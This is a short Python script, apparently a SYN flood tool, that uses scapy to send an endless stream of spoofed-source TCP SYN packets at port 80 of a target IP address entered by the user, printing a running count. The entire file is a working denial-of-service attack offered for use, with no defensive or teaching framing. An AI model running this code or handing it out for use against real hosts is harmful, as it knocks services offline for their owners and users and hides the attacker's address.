from scapy.all import *

source_IP = RandIP()
target_IP = input(">>>Target IP Address: ")
source_port = int(input(">>>Port: "))
i = 1

while True:
   try:
      ip_add = IP(src = source_IP, dst = target_IP)
      tcp_connect = TCP(sport = source_port, dport = 80, flags='S')
      pkt = ip_add / tcp_connect
      send(pkt, inter = .001)

      print (source_IP, "send", i, "Packet to " +target_IP)
      i = i + 1

   except KeyboardInterrupt:
      exit("\n>>>Program exited!")